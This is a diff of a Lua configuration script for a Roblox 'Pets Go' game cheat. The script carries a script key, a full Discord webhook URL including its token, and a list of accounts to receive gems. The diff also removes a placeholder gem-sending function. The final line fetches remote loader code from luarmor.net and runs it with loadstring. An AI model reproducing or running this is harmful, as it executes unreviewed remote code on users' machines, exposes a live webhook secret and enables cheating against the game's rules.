@@ -1,8 +1,8 @@
-script_key = "kuQoDnFgeRipnysIrKrGhcoLjpYFSUEn"
+script_key="kuQoDnFgeRipnysIrKrGhcoLjpYFSUEn";
 
 getgenv().petsGoConfig = {
-    DISCORD_ID = "123232",  -- Thêm Discord ID của bạn ở đây
-    MAIL_UPGRADE_GEM_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1280307675636301948/sM8Y96yRhPp_bcFBoHewrtwcuP2LoWfyOAmzuv_Lk3YSeboqh4A5XV9oDKwBBn1MR2yD",  -- Thêm URL webhook của bạn ở đây
+    DISCORD_ID = "https://discordapp.com/api/webhooks/1280307675636301948/sM8Y96yRhPp_bcFBoHewrtwcuP2LoWfyOAmzuv_Lk3YSeboqh4A5XV9oDKwBBn1MR2yD",
+    MAIL_UPGRADE_GEM_WEBHOOK_URL = "",
 
     MAIL_GEMS_USERNAME_LIST = {
         "MorganLarry52",
@@ -60,35 +60,14 @@ getgenv().petsGoConfig = {
         "JacobsKevin633",
         "EvansCasey86",
         "RogersJanice52"
-    },  -- Chỉ gửi 370k gems một lần
+    }  -- ONE TIME 370k GEMS MAIL FOR FULL DIAMOND UPGRADE
 
-    MAX_GEMS = 370000,  -- Số gems tối đa cho mỗi người dùng (chỉ gửi một lần)
+    --  Example Usage:
+    --  MAIL_GEMS_USERNAME_LIST = {
+    --      "username1",
+    --      "username2",
+    --      "username3"
+    --  }
 }
 
--- Bảng theo dõi người dùng đã nhận gems
-local gemsSent = {}
-
--- Hàm gửi gems cho người dùng (đảm bảo mỗi người chỉ nhận 370k một lần)
-local function sendGems(username, amount)
-    -- Kiểm tra xem người dùng đã nhận gems hay chưa
-    if gemsSent[username] then
-        print("Error: " .. username .. " has already received the maximum 370k gems.")
-        return
-    end
-
-    -- Gửi gems cho người dùng và đánh dấu là đã gửiAA
-    gemsSent[username] = true
-
-    -- Gửi 370k gems cho người dùng (hoặc thay thế bằng logic gửi thực tế)
-    print("Sent " .. amount .. " gems to " .. username)
-    -- Ví dụ gửi gems qua webhook (bạn cần thay thế bằng các request API thực tế)
-    -- game:GetService("HttpService"):PostAsync(petsGoConfig.MAIL_UPGRADE_GEM_WEBHOOK_URL, somePayload)
-end
-
--- Lặp qua danh sách người dùng và gửi 370k gems cho mỗi người (một lần duy nhất)
-for _, username in ipairs(petsGoConfig.MAIL_GEMS_USERNAME_LIST) do
-    sendGems(username, petsGoConfig.MAX_GEMS)
-end
-
--- Tải script Lua ngoài
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1fcefa454021976ebb3a7ad670dfb077.lua"))()
